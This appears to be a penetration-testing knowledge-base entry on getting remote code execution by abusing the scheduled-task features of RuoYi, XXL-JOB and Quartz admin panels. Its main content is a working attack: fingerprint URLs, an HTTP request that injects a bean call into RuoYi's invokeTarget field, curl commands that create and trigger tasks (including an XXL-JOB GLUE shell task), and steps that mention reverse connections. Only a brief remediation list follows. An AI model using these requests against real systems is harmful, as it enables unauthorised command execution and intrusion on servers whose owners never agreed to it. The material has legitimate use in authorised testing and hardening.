---
title: Admin scheduled-task / job injection (Quartz, XXL-JOB, RuoYi)
cve: None (feature abuse)
severity: critical
cvss: 9.1
product: RuoYi/XXL-JOB/Quartz admin panels
versions: Any
ports: 80, 443, 8080
keywords: scheduled tasks, quartz, xxl-job, RuoYi, rce, scheduled jobs
entry: Writable task execution content / cron expressions
verified: false
sources: Compiled from public sources (feature abuse)
---

## Fingerprints

```
GET  /monitor/job          → RuoYi scheduled-tasks page
GET  /xxl-job-admin        → XXL-JOB console
POST /monitor/job/add      {"invokeTarget":"...","cronExpression":"0/5 * * * * ?"}
```

## Prerequisites

- Admin-panel access (through weak passwords/authorization bypass/unauthenticated access);
- A "create/edit scheduled task" menu exists.

## PoC

```http
### RuoYi: insert a bean call into invokeTarget (if common forms are blocked, try another form)
POST /monitor/job/add HTTP/1.1
Authorization: Bearer <token>

{"jobName":"x","jobGroup":"DEFAULT","invokeTarget":"ryTask.ryParams('id')","cronExpression":"0/5 * * * * ?","misfirePolicy":"1","concurrent":"1","status":"0"}
```

```bash
# Execute once immediately and check output or out-of-band activity
curl -s -X PUT https://target/monitor/job/run -H "Authorization: Bearer <t>" -d 'jobId=1&jobGroup=DEFAULT'
# Confirmation: command output appears in task logs / attacker receives a reverse connection
```

```bash
# XXL-JOB: create a GLUE(Shell) task
curl -s -X POST 'https://target/xxl-job-admin/jobinfo/add' -b /tmp/xxl.jar \
  -d 'jobGroup=1&jobDesc=x&executorHandler=&glueType=GLUE_SHELL&glueSource=id&cronGen_display=0/5 * * * * ?&executorRouteStrategy=FIRST'
```

## Exploitation Steps

1. First confirm menu access (authorization bypass also provides an entry point);
2. Create a task at the lowest frequency (60 seconds), running `id` or a reverse connection;
3. Success means RCE—record it immediately; do not leave persistent tasks;
4. Evidence: task-creation response + execution logs.

## Remediation and Mitigation

- Strong admin passwords + 2FA; allow only allowlisted beans in scheduled tasks (new RuoYi versions already block this by default);
- Restrict XXL-JOB administration to the internal network and disable GLUE mode by default.

## References

- Official RuoYi security guidance; XXL-JOB security configuration documentation.
